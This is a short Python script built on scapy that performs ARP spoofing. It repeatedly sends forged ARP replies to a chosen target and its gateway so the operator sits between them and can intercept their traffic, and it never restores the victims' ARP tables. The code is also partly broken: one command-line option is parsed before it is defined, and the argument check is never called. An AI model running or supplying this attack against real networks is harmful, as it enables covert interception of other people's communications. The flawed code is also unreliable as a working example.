#!/usr/bin/env python

import scapy.all as scapy
import argparse
import time

def main():
    targetIP_1, targetIP_2 = get_arguments()
    packet1 = spoofed_packet(targetIP_1, targetIP_2)
    packet2 = spoofed_packet(targetIP_2, targetIP_1)
    sent_packets = 0
    try:
        while True:
            scapy.send(packet1, verbose=False)
            scapy.send(packet2, verbose=False)
            sent_packets += 2
            print(f'\r[+] Sent two spoofed packets to {targetIP_1} and {targetIP_2}. Total sent: {sent_packets}', end='')
            time.sleep(2)
    except KeyboardInterrupt:
        print('\n[+] Exiting...')


def spoofed_packet(targetIP_1, targetIP_2):
    #gets mac for provided IP first:
    mac = get_mac(targetIP_1)

    #Creates a packet to spoofed_packet a target that we are the gateway IP
    #pdst=destination IP (of our target)
    #hwdst=destination MAC (of out target)
    #prsc=projected source (what we're telling this target our fake IP is)
        #reassociates MAC address in target's table for this IP to our MAC
    packet = scapy.ARP(op=2, pdst=targetIP_1, hwdst=mac, psrc=targetIP_2)

    return packet


def get_mac(ip):
    #creates an arp request packet at target ip
    arp_request = scapy.ARP(pdst=ip)
    #creates a broadcast packet to the generic broadcast mac addr
    broadcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
    #combines the arp and broadcast packets for later use
    arp_request_broadcast = broadcast/arp_request
    #sends arp packet via srp and stores answered and unanswered packet responses
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    
    return answered_list[0][1].hwsrc


def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument('-t', '--target', dest='targetIP_1', help="IP of device that user wishes to trick.")
    options = parser.parse_args()
    parser.add_argument('-g', '--gateway', dest='targetIP_2', help="IP of the gateway device your target is using and you want to get between.")
    options = parser.parse_args()

    return options.targetIP_1, options.targetIP_2


def check_args(targetIP_1, targetIP_2):
    if targetIP_1 == None:
        print('Please input a target to trick using the "-t" command.\n(Use --help for help)')
        exit()
    if targetIP_2 == None:
        print('Please input an IP of the gateway device your target is using and you want to get between using the "-g" command.\n(Use --help for help)')
        exit()


if __name__ == '__main__':
    main()